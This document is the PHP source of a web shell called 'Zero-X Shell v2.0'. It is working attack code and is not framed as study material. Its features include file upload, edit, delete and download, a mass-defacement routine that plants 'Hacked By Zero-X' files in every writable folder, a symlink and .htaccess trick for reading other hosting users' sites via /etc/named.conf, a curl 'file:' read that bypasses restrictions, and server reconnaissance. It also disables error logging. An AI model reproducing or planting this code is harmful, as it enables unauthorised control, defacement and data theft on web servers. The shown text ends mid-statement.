<?php
error_reporting(0);
session_start();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
if (get_magic_quotes_gpc()) {
function stripslashes_deep($value)    {
        $value = is_array($value) ?
                    array_map('stripslashes_deep', $value) :
                    stripslashes($value);
        return $value;
    }
$_POST = array_map('stripslashes_deep', $_POST);
$_GET = array_map('stripslashes_deep', $_GET);
$_COOKIE = array_map('stripslashes_deep', $_COOKIE);
$_REQUEST = array_map('stripslashes_deep', $_REQUEST);
}
if($_GET['do']=="remove"){
unlink(getcwd().$_SERVER["SCRIPT_NAME"]);
}
$basep=$_SERVER['DOCUMENT_ROOT'];
if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
$slash="\\";
$basep=str_replace("/","\\",$basep);
}else{
$slash="/";
$basep=str_replace("\\","/",$basep);
}
if($_GET['do']=="remove"){
unlink(getcwd().$slash.$_SERVER["SCRIPT_NAME"]);
}
if ($_REQUEST['address']){
if(is_readable($_REQUEST['address'])){
chdir($_REQUEST['address']);}else{
alert("Permission Denied !");}}
$me=$_SERVER['PHP_SELF'];
$formp="<form method=post action='".$me."'>";
$formup="<form method=post action='".$me."' enctype='multipart/form-data' name='uploader'>";
$formg="<form method=get action='".$me."'>";
$nowaddress='<input type=hidden name=address value="'.getcwd().'">';
if(ini_get('disable_functions')){
$disablef=ini_get('disable_functions');
}else{
$disablef="All Functions Enable";
}
if(ini_get('safe_mode')){
$safe_modes="On";
}else{
$safe_modes="Off";
}
$picdir=<<< EOFILE
iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAA3NCSVQICAjb4U/gAAABhlBMVEX//v7//v3///7//fr//fj+/v3//fb+/fT+/Pf//PX+/Pb+/PP+/PL+/PH+/PD+++/+++7++u/9+vL9+vH79+r79+n79uj89tj89Nf889D88sj78sz78sr58N3u7u7u7ev777j67bL67Kv46sHt6uP26cns6d356aP56aD56Jv45pT45pP45ZD45I324av344r344T14J734oT34YD13pD24Hv03af13pP233X025303JL23nX23nHz2pX23Gvn2a7122fz2I3122T12mLz14Xv1JPy1YD12Vz02Fvy1H7v04T011Py03j011b01k7v0n/x0nHz1Ejv0Hnuz3Xx0Gvz00buzofz00Pxz2juz3Hy0TrmznzmzoHy0Djqy2vtymnxzS3xzi/kyG3jyG7wyyXkwJjpwHLiw2Liw2HhwmDdvlXevVPduVThsX7btDrbsj/gq3DbsDzbrT7brDvaqzjapjrbpTraojnboTrbmzrbmjrbl0Tbljrakz3ajzzZjTfZijLZiTJdVmhqAAAAgnRSTlP///////////////////////////////////////8A////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////9XzUpQAAAAlwSFlzAAALEgAACxIB0t1+/AAAAB90RVh0U29mdHdhcmUATWFjcm9tZWRpYSBGaXJld29ya3MgOLVo0ngAAACqSURBVBiVY5BDAwxECGRlpgNBtpoKCMjLM8jnsYKASFJycnJ0tD1QRT6HromhHj8YMOcABYqEzc3d4uO9vIKCIkULgQIlYq5haao8YMBUDBQoZWIBAnFtAwsHD4kyoEA5l5SCkqa+qZ27X7hkBVCgUkhRXcvI2sk3MCpRugooUCOooWNs4+wdGpuQIlMDFKiWNbO0dXTx9AwICVGuBQqkFtQ1wEB9LhGeAwDSdzMEmZfC0wAAAABJRU5ErkJggg==
EOFILE;
$picdl=<<< EOFILE
iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACNElEQVR42mNkgAAuIJZjIA08AuJvjFCOxus3b6////+fgYmJEYiZGBgZGSEYJItEgwATkObh4dEEMm8gGfAGagATWAEjkH787g/YEHkRNgwDuLm5UQ14++4dhgFn7n8HazRX4UG4AmwOIwMnJyeqAe8/fEAYADVk45n3IOUMQebCcC/BADs7O6oBHz5+vA52HpIBk7Y9A0sW+sqiaAaxWVlZUQ349PkzwgBGSEDWLL8PlmyPUUEJfpABLCwsqAZ8/vLl+tz9rxjstfgZNKW5wQZkz74FlpyergGmbzz9xrD/ynuGLA8ZBmZmZlQDvn79ev3g9U8MS4+8ZggwE2HwNxFhiJ10DSy5tECHYePpNwzrTr5iSHCUYnDWFQJZgGrAt2/froOctuXce4Ylh18yGCnyMpy68wksaabKz3Du3ieGOHtJoOGiYDEMF3z7/v06zO+LgQYsP/IKKPwf5muGcEsRhhBTPoYfP34y/P3394+MtLQ2UOIW3IDvIAOQUuDkHU8Z1px4BZYMMBFiCDVgZnj85AkDBwfH//q6up4dO3ZUAaP9D9yAHz9+XIdpBhkEAi1rHzL8+/+PIcuRj+HqlasMZmYmDNk5OUsWL1qcBtT8HeI2NANQ8gEQ//nzh+Hhw0cMz188/z9nzuylixYuygKq/wyPUiitDgzEa8C4ZULWDDPg9t17fwoL8ibv2rmrHqj2C1LggA0AuZcHZAgQc4BSKRSzgQIbqu43ED+Aav6OhH8BAJE32hNqWv+aAAAAAElFTkSuQmCC
EOFILE;
$picfile='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAAAAAA6mKC9AAAAAnRSTlMAwO33D4gAAAACYktHRAAAqo0jMgAAAEBJREFUGNNjOIAGGGCMHpjAuf9gcO55D5rAf6gIXODcOYgumMB/SyBAEfh/4EA2qsD/5+gC/+kpcKAnGwbALgUAoC7ToHgxi6sAAAAASUVORK5CYII=';
$picdel=<<< EOFILE
iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAAG9JREFUOMutksENwDAIA70TO7ETO7GT+2gfVQIJtLGUT7APhABOyFTpAE2VFb8DnD5oQgK0sTj40roD5PMik2/gE+htLocjSDu8muRTuA2JOpchq7G3EBch9V5a5mF6AyKlQ0ohLrXwUp0w/zQ6rgvx6WzHFXakrgAAAABJRU5ErkJggg==
EOFILE;
$piczip=<<< EOFILE
iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABV0lEQVR42mNkIAKkTbn+H5ccI4hIn3Kj5j/D/2Z8hszM1gDTF18hxKatvsHAmDb5WllWmGanvhiqJDpYt/85Q5CjJJwNAi/efGRgDG869v/dmzcEvcEvJMjw8d17OF9RTRXhhffrxf/j0ywY+BKsrm7Fs/8gV5S2bmbYPcmPEcUAfuddDP+ezEbRyCSTyvBxrxuSAc+BBkhgN4DPbh1Df40NigGFLUcYPh0KQjLgBdAAcewG8FouYri/J5zh1ccvYM2SQnwMco7LGT4fj0My4CXQADFMA9qKJfCGQVXvC7C62uWv/gc7iaIaENJw+D9y6BIL4LFAbDoAyYMARkICMUCGMDAyduKzUVxYlCHYSRjMXrvvLZh++fY1xABCAJc3hUREsBvwHwjSp94As2flaDLCMhMoP4C8AHI6DGA1AKQhK1QDRSFMMzKAhwEuJ4OcuLLOihGfFwBBt7Od5rYzfwAAAABJRU5ErkJggg==
EOFILE;
$head='<style type="text/css">
body{background-color:#000020;}
A:link {text-decoration: none}
A:visited {text-decoration: none}
A:active {text-decoration: none}
A:hover {text-decoration: underline overline; color: #000dd0;}
.focus td{border-top:0px solid #f8f8f8;border-bottom:1px solid #ddd;background:#f8f8f8;padding:0px 0px 0px 0px;}
</style><head>'.base64_decode("PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPQ==").'"data:image/png;base64,R0lGODlhIAAYAOYAAOE6QONFSux/guZaXuRNU8TExOt9gLKysvv7++pzdZaWluE2O/39/f7+/u3t7ehlauI9QuE5PuJBR/Dw8Pn5+e2FiL6+vsrKyrq6uq+vr/Ly8uhscOVVWeRGS+JBRuRMUfb29uhhZeZZXe2Nj+RJTudcYe6OkPX19fT09OVZXff39+RNUe/v7+VSV+A1OuZXW+VUWOt+geE7QeNFS+lvc+AxNut3e+ZaX+VQVehmae6UlsLCwoWFheZYXO7u7q2trf///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAgABgAAAf/gBcFO4SFhoeIiQUXFhw9j5CRkpOUIhYHLzqam5ydnp8bBz8wJgIxMQKmp6inqquprasjOT8/OBU2ubq7vL28FSG1KwY0xcbHyMnIBiW1JAk50dLT1NXUCSm1HQ833d7f4OHgDy21HgM46err7O3sAx+1EAQz9TMB9/b4Afj59fv26NWKIAEAABkGZShEeBDhwocLD0qAUMvFghoYM2rcyHHjggi1gIgcSbKkyZMiazVAybIlkAa1GLicWZJBLQQ0cwJBUIuCTpoUaqn4ORNErRNEXaKopSFpSw21JjhlOaEWi6koffzI4MCH169gw4od6yADBgU80qpdy7atWwUYAgIBADs=">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>'.base64_decode("WmVyby1YIFNoZWxsIHYyLjA=").'</title>
</head><body  topmargin="0" leftmargin="0" rightmargin="0" 
bgcolor="#0000"><div align="center">
<table border="1" width="1000" height="14" bordercolor="#CDCDCD" style="border-collapse: collapse; border-style: solid; border-width: 1px">
<tr>
<td height="30" width="996">
<p align="center"><a href="?do=info&address='.getcwd().'">
<font color="#FFFFFF">[ Server Info ]</font></a>  <font color="#FFD600" face="Tahoma" style="font-size: 9pt"><span lang="en-us">   <a title="HOME" href="?do=home"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAABGdBTUEAAK/INwWK6QAAACpQTFRFAAAAAAAAAwMDMzMzM2aZZmZmhYWFmZmZtbW1zs7O3t7e7+/v/wAA////JsDqUgAAAAF0Uk5TAEDm2GYAAABiSURBVAjXY2BABgZsyWA65zDbJhDNdlDGbDNYQKLx4CawQO8NGWGwwN3djYfAArd3r5AxYGDTuLt716pJBgwMubfLg1dNZgAxSpwhjF1ABsic3FlQkcyZJc4zQQxjMEC4AAC5eiUhU9Ah5gAAAABJRU5ErkJggg==" /></a> -- <a href="?do=filemanager&address='.getcwd().'"><font color="#FFFFFF">File Manager</font></a> -- <a href="?do=upload&address='.getcwd().'"><font color="#FFFFFF">Upload</font></a> --<a href="?do=NewFolder&address='.getcwd().'"><font color="#FFFFFF">New Folder</font></a> --  <a href="?do=symlink&address='.getcwd().'"><font color="#FFFFFF">Symlink</font></a> -- <a href="?do=mass&address='.getcwd().'"><font color="#FFFFFF">Mass Deface</font></a> -- <a href="?do=remove&address='.getcwd().'"><font color="#FFFFFF">Kill Me</font></a> -- 
</span></font></td></tr></table></div>
<div align="center">
<table id="table2" style="border-collapse: collapse; border-style: 
solid;" width="1000" bgcolor="#eaeaea" border="1" bordercolor="#c6c6c6" 
cellpadding="0"><tbody><tr><td><div align="center"><table id="table3" style="border-style:dashed; border-width:1px; margin-top: 1px; margin-bottom: 0px; 
border-collapse: collapse" width="950" border="1" bordercolor="#cdcdcd"
height="10" bordercolorlight="#CDCDCD" bordercolordark="#CDCDCD"><tbody><tr><font color="green" face="Tahoma" style="font-size: 9pt"><div align="center">
System : '.php_uname().' | Php Version : '.phpversion().' | Safe Mode : '.$safe_modes.' <td style="border: 1px solid rgb(198, 198, 198);" 
width="950" bgcolor="#e7e3de" height="10" valign="top">';
$end='</td></tr></tbody></table></div></td></tr><tr><td bgcolor="#000020"><p style="margin-top: 0pt; margin-bottom: 0pt" align="center"><span lang="en-us"><font Color="#e1e1e1" face="Tahoma" style="font-size: 9pt">'.base64_decode("WmVyby1Y4oSi").'</a></font></span></td></tr></tbody></table></div></body></html>';
$deny=$head."<p align='center'> <b>Oh My God!<br> Permission Denied".$end;
function alert($text){
echo "<script>alert('".$text."')</script>";
}
if ($_GET['do']=="download" && $_GET['filename']!="dir"){
if (file_exists($_GET['filename'])) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.$_GET['filename'].'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($_GET['filename']));
    readfile($_GET['filename']);
    exit;
}
}
if ($_GET['do']=="NewFolder" ){
echo $head.$formp.$nowaddress.'<p align="center">Create New Folder : <input name=cdirname value="0x" size=40><input type=hidden name=address value='.getcwd().'><input type="submit"  value="Create Folder"/></form></p>'.$end;exit;
}if ($_REQUEST['cdirname']){
if(mkdir($_REQUEST['cdirname'])){alert("Directory Created !");}else{alert("Permission Denied !");}}

	if ($_GET['do']=="upload") {
	echo $head.$formup.'<p align="center">Uploader : <input type="file" name="file" size="50"><input type=hidden name=address value='.getcwd().'><input name="_zx" type="submit"  value="Upload"/></form></p>'.$end;exit;
	}if($_POST['_zx'] == "Upload") {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {alert("File Uploaded !");}else{alert("Permission Denied !");}}

if ($_GET['do']=="edit" && $_GET['filename']!="dir"){
if(is_readable($_GET['address'].$_GET['filename'])){
$opedit=fopen($_GET['address'].$_GET['filename'],"r");
while(!feof($opedit))
$data.=fread($opedit,9999);
fclose($opedit); 
echo $head.$formp.$nowaddress.'<p align="center">File Name : '.$_GET['address'].$_GET['filename'].'<br><textarea rows="19" name="fedit" cols="87">'.htmlentities("$data").'</textarea><br><input value='.$_GET['filename'].' name=namefe><br><input type=submit value="  Save  "></form></p>'.$end;exit;
}else{alert("Permission Denied !");}}
function sizee($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
function deleteDirectory($dir) {
if (!file_exists($dir)) return true;
if (!is_dir($dir) || is_link($dir)) return unlink($dir);
foreach (scandir($dir) as $item) {
if ($item == '.' || $item == '..') continue;
if (!deleteDirectory($dir . "/" . $item)) {
chmod($dir . "/" . $item, 0644);
if (!deleteDirectory($dir . "/" . $item)) return false;
};}return rmdir($dir);}
function zipDirectory($dir) {
$rootPath = realpath($dir);
$zip = new ZipArchive();
$zip->open($_GET['address'].$_GET['filename'].'.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE);
$files = new RecursiveIteratorIterator(
    new RecursiveDirectoryIterator($rootPath),
    RecursiveIteratorIterator::LEAVES_ONLY
);
foreach ($files as $name => $file)
{
    if (!$file->isDir())
    {
        $filePath = $file->getRealPath();
        $relativePath = substr($filePath, strlen($rootPath) + 1);
        $zip->addFile($filePath, $relativePath);
    }
}
$zip->close();}
function dirpe($addres){
global $slash;
$idd=0;
if ($dirhen = @opendir($addres)) {
while ($file = readdir($dirhen)) {
$permdir=str_replace('//','/',$addres.$slash.$file);
if($file!='.' && $file!='..' && is_dir($permdir)){
if (is_writable($permdir)) {
$dirdata[$idd]['filename']=$permdir; 
$idd++;
}
dirpe($permdir);
			}
		}
		closedir($dirhen);
	} else {
		return ("notperm");
	}
	if ($dirdata){
	return $dirdata;
	}else{
		return "notfound";
	}
}
function dirpmass($addres,$massname,$masssource){
global $slash;
$idd=0;
if ($dirhen = @opendir($addres)) {
while ($file = readdir($dirhen)) {
$permdir=str_replace('//','/',$addres.$slash.$file);
if($file!='.' && $file!='..' && is_dir($permdir)){
if (is_writable($permdir)) {
if ($fm=fopen($permdir.$slash.$massname,"w")){
fwrite($fm,$masssource);
fclose($fm);
$dirdata[$idd]['filename']=$permdir; 
}
$idd++;
}
dirpmass($permdir);
			}
		}
		closedir($dirhen);
	} else {
		return ("notperm");
	}
	if ($dirdata){
	return $dirdata;
	}else{
		return "no folder found";
	}
}
if($_GET['do']=="mass"){
echo $head.$formp.'<p align="center">[Mass Deface]<br><input name=mffw value="'.getcwd().$slash.'" size=50><input name=massname value="x.txt" size=10><br><textarea name=masssource cols=60 rows=18>
Hacked By Zero-X</textarea><br><input type=submit value="  Mass  "></form></p>'.$end;exit;
}
if ($_POST['mffw']){
$arrfilelist=dirpmass($_POST['mffw'],$_POST['massname'],$_POST['masssource']);
if ($arrfilelist=='notfound'){
alert("Not Found !");
}elseif($arrfilelist=='notperm'){
alert("Permission Denied !");
}else{
foreach ($arrfilelist as $tmpdir){
		if ($coi %2){
$colort='"#e7e3de"';
}else{
$colort='"#e4e1de"';}
$coi++;
$permdir=$permdir.'<table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 1px" bordercolor="#CDCDCD" bgcolor='.$colort.' width="950" height="20" dir="ltr">
<tr><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="Tahoma" style="font-size: 9pt"><a href="?address='.$tmpdir['filename'].'"><b>'.$tmpdir['filename'].'</b></span></td>
<td valign="top" height="19" width="65"><font face="Tahoma" style="font-size: 9pt"></td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"></td><td valign="top" height="19" width="22"><font face="Tahoma" style="font-size: 9pt"></td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"></td>
<td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"></td></tr></table>';}
echo $head.'
<font face="Tahoma" style="font-size: 6pt"><table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 1px" bordercolor="#CDCDCD" width="950" height="20" dir="ltr">
<tr><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="Tahoma" style="font-size: 9pt"><font color=#4a7af4>Directory : '.explode("/",getcwd())."<br>".printdrive().'<br><a href="?do=back&address='.$backaddresss.'"><font color=#000000>Back</span></td>
</tr></table>'.$permdir.'</table>
<table border="0" width="950" style="border-collapse: collapse" id="table4" cellpadding="5"><tr>
<td width="200" align="right" valign="top" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
</td></tr>'.$end;exit;
}}
if($_REQUEST['nf4c'] && $_REQUEST['nf4cs']){
if($ofile4c=fopen($_REQUEST['nf4c'],"w")){
fwrite($ofile4c,$_REQUEST['nf4cs']);
fclose($ofile4c);
alert("File Saved !");}else{alert("Permission Denied !");}}
function bypcu($file){
$level=0;
if(!file_exists("file:"))
	mkdir("file:");
chdir("file:");
$level++;
$hardstyle = explode("/", $file);
for($a=0;$a<count($hardstyle);$a++){
	if(!empty($hardstyle[$a])){
		if(!file_exists($hardstyle[$a])) 
			mkdir($hardstyle[$a]);
		chdir($hardstyle[$a]);
		$level++;
	}
}
while($level--) chdir("..");
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "file:file:///".$file);
echo '<FONT COLOR="RED"> <textarea rows="40" cols="120">';
if(FALSE==curl_exec($ch))
	die('>Sorry... File '.htmlspecialchars($file).' doesnt exists or you dont have permissions.');
echo ' </textarea> </FONT>';
curl_close($ch);
}
if ($_REQUEST['bypcu']){
bypcu($_REQUEST['bypcu']);
}
function printdrive(){
global $slash;
foreach (range("A","Z") as $tempdrive) {
if (is_dir($tempdrive.":".$slash)){
$adri=$tempdrive.":".$slash;
$drivea=$drivea.'<a href="?address='.$adri.'"><font size=1>'.$tempdrive.':'.$slash.' </a></font>';
}
}
return $drivea;
}
if($_GET['do']=="delete"){
if ($_GET['type']=="dir"){
if(is_writable($_REQUEST['address'])){
$dir=$_GET['address'].$_GET['filename'];
deleteDirectory($dir);
alert("Deleted Successful !");
}else{alert("Permission Denied !");}
}elseif($_GET['type']=="file"){
if(is_writable($_GET['address'].$_GET['filename'])){
unlink($_GET['address'].$_GET['filename']);alert("Deleted Successful !");
}else{alert("Permission Denied !");}}}
if($_GET['do']=="zipper"){
if ($_GET['type']=="dir"){
if(is_writable($_REQUEST['address'])){
$dir=$_GET['address'].$_GET['filename'];
zipDirectory($dir);
alert("zipped Successful !");
}else{alert("Permission Denied !");}
}elseif($_GET['type']=="file"){
if(is_writable($_GET['address'].$_GET['filename'])){
zipFile($dir);alert("Zipped Successful !");
}else{alert("Permission Denied !");}}}
if($_POST['fedit'] && $_POST['namefe']){
if(is_writable($_REQUEST['address'])){
$opensave=fopen($_POST['address'].$slash.$_POST['namefe'],"w");
fwrite($opensave,html_entity_decode($_POST['fedit']));
fclose($opensave);alert("File Saved Successful !");
}else{alert("Permission Denied !");}}
if($_GET['do']=="info"){
if(ini_get('register_globals')){
$registerg="Enable";
}else{
$registerg="disable";}
if(extension_loaded('curl')){
$curls="Enable";
}else{
$curls="disable";
}
if(@function_exists('mysql_connect')){
$db_on = "Mysql : On";
};
if(@function_exists('mssql_connect')){
$db_on = "Mssql : On";
};
if(@function_exists('pg_connect')){
$db_on = "PostgreSQL : On";
};if(@function_exists('ocilogon')){
$db_on = "Oracle : On";
};
echo $head."<font face='Tahoma' size='2'>Operating System : ".php_uname()."<br>Server Name : ".$_SERVER['HTTP_HOST']."<br>Disable_Functions : ".$disablef."<br>Safe_Mode : ".$safe_modes."<br>Openbase_dir : ".ini_get('openbase_dir')."<br>Php Version : ".phpversion()."<br>Free Space : ".sizee(disk_free_space("/"))."<br>Total Space : ".sizee(disk_total_space("/"))."<br>Register_Globals : ".$registerg."<br>Curl : ".$curls."<br>Database ".$db_on."<br>Server Name : ".$_SERVER['HTTP_HOST']."<br>Admin Server : ".$_SERVER['SERVER_ADMIN'].$end;
exit;
}
if ($_GET['do']=="symlink"){
	@mkdir('sym',0777);
$htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','sym/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
"<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; 
}
else
{
"<br><br><div class='tmp'><table border='1' bordercolor='#00ff00' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','sym/root');
$name   = $string[1][0];
flush();}}}}
echo $head.'<div class=dom><a target=_blank href=http://www.'.$string[1][0].'/>'.$name.' </a> </div>
<td>'.$UID['name'].'</td>
<td>
<a href=sym/root/home/'.$UID['name'].'/public_html target=_blank>Symlink </a>
</td>
</tr></div>' .$end;exit;}

if($_REQUEST['file2ch'] && $_REQUEST['chmodnow']){
$chmodnum2=$_REQUEST['chmodnow'];
chmod($_REQUEST['file2ch'],"0".$chmodnum2);
}
if($_GET['do']=="chmod"){
echo $head.$formg.$nowaddress."<p align=center><b>Chmod</b><br><input size=50 name=file2ch value='".$_REQUEST['address'].$_REQUEST['filename']."'> To  <input name=chmodnow size=1 value=644><br><input type=submit value=Set></form>".$end;exit;
}
$araddresss=explode($slash,getcwd());
$matharrayy=count($araddresss)-1;
$addr1backk=str_replace($araddresss[$matharrayy],"",$araddresss);
for($countback=0;$countback<count($addr1backk);$countback++){
$arraybacke[$countback]=$slash.$addr1backk[$countback];
$backdirunixx=$backdirunixx.$slash.$addr1backk[$countback];
}
if ($slash=="\\"){
$countback=null;
$backdirwin=null;
for($countback=1;$countback<count($addr1backk);$countback++){
$backdirwin=$backdirwin."\\".$addr1backk[$countback];}
$backdirwin=$addr1backk[0].$backdirwin;
$backaddresss=$backdirwin;
}else{
$countback=null;
$backdirwin=null;
for($countback=1;$countback<count($addr1backk);$countback++){
$backdirwin=$backdirwin."/".$addr1backk[$countback];}
$backdirwin=$addr1backk[0].$backdirwin;
$backaddresss=$backdirwin;
$backaddresss=str_replace("\\","/",$backaddresss);
}
function calc_dir_size($path)
{
$size = 0;
if ($handle = opendir($path))
{
while (false !== ($entry = readdir($handle)))
{
$current_path = $path . '/' . $entry;
if ($entry != '.' && $entry != '..' && !is_link($current_path))
{
if (is_file($current_path))
$size += filesize($current_path);
elseif (is_dir($current_path))
$size = calc_dir_size($current_path);
}
}
}
closedir($handle);
return $size;
} 
function openf($parsef){
global $basep,$slash;
if(strlen(strpos(getcwd(),$basep))>=1){
$rr=str_replace($basep,"",getcwd());
$rr=str_replace("\\","/",$rr);
$diropen='<a href="'.$rr."/".$parsef.'">'.$parsef.'</a>';
}else{
$diropen='<a href="?do=edit&address='.getcwd().$slash.'&filename='.$parsef.'">'.$parsef.'</a>';
}
return $diropen;
}
if ($_GET['address']){$ifget=$_GET['address'];}if($_POST['address']){$ifget=$_POST['address'];}
if($cwd==''){$cwd=getcwd();}$nowaddress='<input type=hidden name=address value="'.$cwd.'">';
$ad=getcwd();
$hand=opendir("$ad");
$coi=0;
$coi2=0;
while (false !== ($fileee = readdir($hand))) {
        if ($fileee != "." && $fileee != "..") {
		if (filetype($fileee)=="dir"){
		if ($coi %2){
$colort='"#e1e1e1"';
}else{
$colort='"#e1e1e1"';
}
$coi++;
$fil=$fil.'<table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 0px" bordercolor="#CDCDCD" bgcolor='.$colort.' width="950" height="1" dir="ltr">
<tr onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$oo.'\';">
<td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="Tahoma" style="font-size: 9pt"><img src="data:image/png;base64,' .$picdir. '" /> <a href="?address='.$cwd.$slash.$fileee.$slash.'">'.$fileee.'</b></span></td>
<td valign="top" height="19" width="65"><font face="Tahoma" style="font-size: 9pt">'.date("y/m/d", filectime($fileee)).'</td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"><a href="?do=chmod&type=dir&address='.$cwd.$slash.'&filename='.$fileee.'">'.substr(sprintf('%o', fileperms($cwd.$slash."$fileee")), -3).'</a></td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"></td>
<td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"><a href="?do=delete&type=dir&address='.$cwd.$slash.'&filename='.$fileee.'"><img src="data:image/png;base64,'.$picdel.'" title="Delete Folder"/></a></td>
<td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"><a href="?do=zipper&type=dir&address='.$cwd.$slash.'&filename='.$fileee.'"><img src="data:image/png;base64,'.$piczip.'" title="Zip Folder"/></a></td></tr></table>'
;}
else{
		if ($coi2 %2){
$colort='"#e1e1e1"';
}else{
$colort='"#e1e1e1"';
}
$coi2++;
$file=$file.' <div class="ex3"><table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 0px" bordercolor="#CDCDCD" bgcolor='.$colort.' width="950" height="20" dir="ltr">
<tr onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$oo.'\';"><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="Tahoma" style="font-size: 9pt"><img src="data:image/png;base64,' .$picfile. '" /> '.openf($fileee).'</span></td>
<td valign="top" height="19" width="80"><font face="Tahoma" style="font-size: 9pt">'.sizee(filesize($fileee)).'</td><td valign="top" height="19" width="65"><font face="Tahoma" style="font-size: 9pt">'.date("y/m/d", filectime($fileee)).'</td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"><a href="?do=chmod&type=file&address='.$cwd.$slash.'&filename='.$fileee.'">'.substr(sprintf('%o', fileperms($cwd.$slash."$fileee")), -3).'</a></td>
<td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"><a href="?do=edit&address='.$cwd.$slash.'&filename='.$fileee.'" ><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAHhQTFRF////AAAAPi4GVl4PamqZa1AQfmoUfn6wiIcHlJoEmZnMmgAAmnQJnnYJpnwQrKEBrhkErq7is6YAuyUHwKUBwjIHwjQJxykVx1kVyDIOzMz/zTspzzkl0Z4A04UA4KYZ4VAp7XVd8GA78r8A9cIA+ccG/aOM/8wAjPp78QAAAAF0Uk5TAEDm2GYAAABXSURBVBjTY2DAB2TEUfnSakrCyHwReUUFMQEEn11IVUJSlBvBl+JUV5FD5ktx8SvLIvMFubhYcPKBAqh8HkFUPgMPBxqfl4+NGdmJjEysfEg8IODD52MACv8E4ZDpDxgAAAAASUVORK5CYII=" title="Edit File"/> </a></td>
<td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"><a href="?do=download&type=file&address='.$cwd.$slash.'&filename='.$fileee.'"><img src="data:image/png;base64,'.$picdl.'" title="Download File"/></a></td>
<td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"><a href="?do=delete&type=file&address='.$cwd.$slash.'&filename='.$fileee.'"><img src="data:image/png;base64,'.$picdel.'" title="Delete File"/></a></td>
</tr></table>'
;}
}
}
echo $head.'
<font face="Tahoma" style="font-size: 6pt"><table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 1px" bordercolor="#CDCDCD" width="950" height="20" dir="ltr">
